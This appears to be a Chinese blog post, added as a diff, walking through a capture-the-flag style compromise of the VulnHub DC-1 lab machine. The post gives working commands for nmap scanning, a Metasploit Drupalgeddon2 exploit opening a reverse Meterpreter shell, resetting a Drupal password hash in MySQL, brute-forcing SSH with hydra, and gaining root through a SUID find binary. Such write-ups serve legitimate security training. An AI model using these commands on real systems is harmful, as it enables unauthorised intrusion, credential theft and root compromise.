@@ -1,0 +1,257 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/favicon.png"/>
+	<link rel="shortcut icon" href="/img/favicon.png">
+	
+			    <title>
+    zero
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="box" />
+    
+    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+</head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">box</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+		            
+		                <li><a href="https://github.com/miccall" class="icon fa-github"><span class="label">GitHub</span></a></li>
+		            
+		            
+		            
+		            
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(../images/nov10.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >渗透测试实战：DC-1靶机入侵</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>攻击机：kali    网卡NAT模式    192.168.42.149<br>靶机：DC-1    网卡NAT模式<br>靶机下载地址：<a href="https://www.vulnhub.com/?page=2" target="_blank" rel="noopener">https://www.vulnhub.com/?page=2</a></p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>探测靶机IP，使用nmap扫描同网段的主机：<br><blockquote><p>root@kali:~# nmap 192.168.42.0/24 -sP</p>
+</blockquote><br><img src="/images/DC-1/1.jpg"><br>得到靶机IP：192.168.42.151<br>扫描靶机开放端口：<br><blockquote><p>root@kali:~# nmap 192.168.42.151 -A -p 1-65535</p>
+</blockquote><br><img src="/images/DC-1/2.jpg"><br>靶机开放了http服务，ssh服务，rpcbind服务，so<img src="/images/DC-1/3.jpg"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问80，drupal 7 嘞，可以搜一搜有啥可用的漏洞，<br><img src="/images/DC-1/4.jpg"><br>用msf扫一哈网站目录，<br><blockquote><p>root@kali:~# msfconsole<br>msf5 &gt; use auxiliary/scanner/http/dir<br>msf5 auxiliary(scanner/http/dir) &gt; set RHOSTS 192.168.42.151<br>msf5 auxiliary(scanner/http/dir) &gt; set THREADS 50<br>msf5 auxiliary(scanner/http/dir) &gt; run </p>
+</blockquote><br><img src="/images/DC-1/5.jpg"><br>瞧一瞧robots.txt文件，<br><img src="/images/DC-1/6.jpg"><br>使用Searchsploit自动搜索exploit-db漏洞的记录以及利用方式：<br><blockquote><p>root@kali:~# searchsploit drupal</p>
+</blockquote><br><img src="/images/DC-1/7.jpg"><br>msf渗透drupal：<br><blockquote><p>msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set payload php/meterpreter/reverse_tcp<br>payload =&gt; php/meterpreter/reverse_tcp<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.42.151<br>RHOSTS =&gt; 192.168.42.151<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set LHOST 192.168.42.157<br>LHOST =&gt; 192.168.42.157<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</p>
+</blockquote><br>得到一个反弹shell，进入DC-1<br><img src="/images/DC-1/8.jpg"><br>查看一下目录和文件，得到<strong>flag1</strong><br><img src="/images/DC-1/9.jpg"><br>提示配置文件，于是进入site配置文件，<br>目录/var/www/sites/default，找到<strong>flag2</strong>，得到网站数据库的配置信息并提示爆破，<br>使用shell命令切换到cmd的系统权限方式，尝试登陆mysql数据库，<br><img src="/images/DC-1/10.jpg"><br>找到users表，得到用户名和hash加密后的密码，<br><img src="/images/DC-1/11.jpg"><br>于是两个思路，1 爆破；2 重置drupal密码，再update修改数据库密码数据为新密码加密后的密文<br>这里使用思路2，<br><blockquote><p>meterpreter &gt; cd /var/www<br>php scripts/password-hash.sh hahaha    &gt; pwd.php</p>
+</blockquote><br>重新生成密码hahaha的密文，并将结果存入pwd.php文件（这里有个坑，必须在这个目录下执行，不能够再scripts目录下执行）<br><img src="/images/DC-1/12.jpg"><br>再次进入数据库，把生成的密文update到数据库的密码<br>通过浏览器进入靶机，输入用户名密码，登陆成功，找到<strong>flag3</strong><br><img src="/images/DC-1/13.jpg"><br>访问22，尝试爆破ssh密码，可是怎么滴的就知道用户名是flag4了。。。。没有灵性o_o<br>john离线密码破解工具，主要用于破解密码密文；；hydra在线密码破解工具，可以破解ssh啥的，<br>这里使用hydra工具+john中的字典进行爆破：<br><blockquote><p>root@kali:~# hydra -l flag4 -P /usr/share/john/password.lst 192.168.42.151 ssh -f</p>
+</blockquote><br>-f当破解到正确的密码时，停止爆破<br>-vV 显示详细的配置过程<br>-l 指定用户名<br>-P 指定密码字典<br><img src="/images/DC-1/14.jpg"><br>得到账号密码[ flag4/orange ]，登陆ssh，得到<strong>flag4</strong><br><img src="/images/DC-1/15.jpg"><br>提示最后一步需要提权，flag4用户搜索一下含有flag字段的文件，但是根本查不到rot目录下的内容，<br><blockquote><p>Find / -name /<em>flag/</em>    </p>
+</blockquote><br>先查找一下靶机可执行的二进制文件<br><blockquote><p>flag4@DC-1:~# find / -perm -4000 2&gt; /dev/null</p>
+</blockquote><br>使用find提权，find具有SUID标签，所有通过find执行的命令都会root权限运行，<br><blockquote><p>flag4@DC-1:~# touch haha<br>flag4@DC-1:~# find haha -exec “whoami” \;<br>flag4@DC-1:~# find haha -exec “/bin/sh” \;<br> cd /root<br> ls<br> cat thefinalflag.txt</p>
+</blockquote><br><img src="/images/DC-1/16.jpg"></p>
+<p>over！</p>
+<h1 id="get：SUID提权"><a href="#get：SUID提权" class="headerlink" title="get：SUID提权"></a>get：SUID提权</h1><p>suid作用是让普通用户可以以root（或其他）的用户角色运行只有root（或其他）账号才能运行的程序或命令，或程序命令对应本来没有权限操作的文件等。<br>常见的可用于suid提权的命令：<br><blockquote><p>nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp</p>
+</blockquote><br>权限具有传递性，当普通用户使用了具有suid标签的命令时，就会继承root用户的权限，可以读取系统中所有的文件。<br>所以本次实战中，先使用<br><blockquote><p>find / -perm -4000 2&gt; /dev/null</p>
+</blockquote><br>指令查找了当前用户可以执行的命令，找到find，<br>再使用find命令，配合-exec参数，可以对查询的文件进行进一步的操作。<br>-exec参数后面跟的是command命令，终止必须使用’;’分号来判断。<br>对于不同的系统，直接使用分号可能会有不同的意义，所以在分号前使用转义符’\’。</p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2019/07/04/渗透测试实战：DC-1靶机入侵/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://yoursite.com/2019/07/04/渗透测试实战：DC-1靶机入侵/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+            	<span id="busuanzi_container_site_pv">2019总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":220,"height":440},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":220,"height":440},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+ 	
+<script type="text/javascript" src="/js/src/love.js"></script>
+</html>
